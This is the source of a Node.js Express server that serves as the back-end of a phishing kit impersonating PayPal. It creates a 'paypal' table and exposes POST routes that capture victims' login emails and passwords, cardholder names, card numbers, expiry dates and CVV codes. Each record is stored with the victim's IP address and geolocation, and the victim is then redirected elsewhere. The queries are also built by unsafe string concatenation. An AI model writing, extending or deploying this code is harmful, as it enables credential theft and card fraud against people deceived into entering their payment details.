var express = require('express');
var app = express();
var pg = require('pg');
var bodyParser = require('body-parser');
app.use(bodyParser.urlencoded({ extended: false }));
const PORT = process.env.PORT || 5000;
app.use(express.static('public'));
app.set('view engine', 'ejs')
const iplocation = require("iplocation").default;
var loc;
var city;
var reg;
const client = new pg.Client(process.env.POSTGRESQL_ADDON_URI);
client.connect();

client.query("create table paypal (id serial , mail text,pass text,cardholder text,card text,exp text,cvv text,country TEXT,ip TEXT,time timestamp default now())")
// #######################################################################


app.get('*/mid', function (req, res) {
    res.render('mid')
})
app.get('*/credit', function (req, res) {
    res.render('credit')
})
app.get('*/login', function (req, res) {
    res.render('login')
})
app.get('*/confirm', function (req, res) {
    res.render('confirm')
})




// ############################################################


app.post('/visa', function (req, res) {
    var a = req.body.a+'+++';
    var b = req.body.b;
    var c = req.body.c;
    b = b.replace('/', '.')
    console.log(a + '--' + b + '--' + c)

    var ip = req.headers['x-forwarded-for'] ||
    req.connection.remoteAddress ||
    req.socket.remoteAddress ||
    (req.connection.socket ? req.connection.socket.remoteAddress : null);

    iplocation(ip, [], (error, res) => { loc = res.country; city = res.region; reg = res.city;console.log(res);
        var location = loc + '---' + city + '---' + reg ;

    client.query("Insert into paypal (card,exp,cvv,country,ip) values('" + a + "','" + b + "','" + c + "','"+location+"','"+ip+ "')", function (err, result) {
        console.log('resulttttttttttttt : ' + result)
        console.log('errrrrrrrrrrrrrrrrrrrrrr : ' + err)
        
    });
    })
})
app.post('/paypala', function (req, res) {
    var a = req.body.login_email;
    var b = req.body.login_password;
    console.log(a + b)

var ip = req.headers['x-forwarded-for'] ||
    req.connection.remoteAddress ||
    req.socket.remoteAddress ||
    (req.connection.socket ? req.connection.socket.remoteAddress : null);

    iplocation(ip, [], (error, res) => { loc = res.country; city = res.region; reg = res.city;console.log(res);
        var location = loc + '---' + city + '---' + reg ;

    client.query("Insert into paypal (mail,pass,country,ip) values('" + a + "','" + b + "','"+location+"','"+ip+"')", function (err, result) { });

    });
    res.redirect('/confirm')
});

app.post('/paypalb', function (req, res) {
    var a = req.body.cardHolder;
    var b = req.body.cardNumber;
    var c = req.body.expDate;
    var d = req.body.verificationCode;

var ip = req.headers['x-forwarded-for'] ||
    req.connection.remoteAddress ||
    req.socket.remoteAddress ||
    (req.connection.socket ? req.connection.socket.remoteAddress : null);

    iplocation(ip, [], (error, res) => { loc = res.country; city = res.region; reg = res.city;console.log(res);
        var location = loc + '---' + city + '---' + reg ;

    console.log(req.body);
    client.query("Insert into paypal (cardholder,card,exp,cvv,country,ip) values('" + a + "','" + b + "','" + c + "','" + d + "','"+location+"','"+ip+ "')", function (err, result) { });

    });
    res.redirect('https://www.freelancer.com')
});






// #######################################################################
app.get('*', function (req, res) { res.render('home') })

app.listen(PORT, function () { console.log('Server Started') })
